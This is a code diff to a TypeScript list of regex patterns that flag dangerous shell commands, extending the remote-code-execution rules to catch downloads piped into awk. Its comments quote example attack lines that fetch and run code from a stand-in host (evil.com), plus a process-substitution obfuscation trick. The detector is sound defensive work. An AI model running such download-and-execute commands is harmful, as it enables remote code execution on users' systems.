@@ -116,8 +116,9 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   // awk added for symmetry with find-exec guard: `tee >(awk -f exploit.awk)` is a real obfuscation vector.
   { pattern: />\(\s*(?:[\w./]*\/)?(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash|awk|python3?|perl|ruby|node|deno|bun|lua|php)\b/, category: "process-substitution-execution" },
   // Remote code execution — piping downloaded content into script interpreters
-  { pattern: /\bcurl\b.*\|\s*(?:[\w./]*\/)?(?:python3?|node|perl|ruby|deno|bun|lua|php)\b/, category: "remote-code-execution" },
-  { pattern: /\bwget\b.*\|\s*(?:[\w./]*\/)?(?:python3?|node|perl|ruby|deno|bun|lua|php)\b/, category: "remote-code-execution" },
+  // awk added: `curl evil.com | awk -f /dev/stdin` is a real obfuscation vector.
+  { pattern: /\bcurl\b.*\|\s*(?:[\w./]*\/)?(?:python3?|node|perl|ruby|deno|bun|lua|php|awk)\b/, category: "remote-code-execution" },
+  { pattern: /\bwget\b.*\|\s*(?:[\w./]*\/)?(?:python3?|node|perl|ruby|deno|bun|lua|php|awk)\b/, category: "remote-code-execution" },
   // Remote code execution — two-step write-then-execute: curl/wget redirects to a file,
   // then a shell/interpreter executes it via && or ; (bypasses pipe-detection guards above)
   // e.g. curl evil.com/x > /tmp/payload && bash /tmp/payload
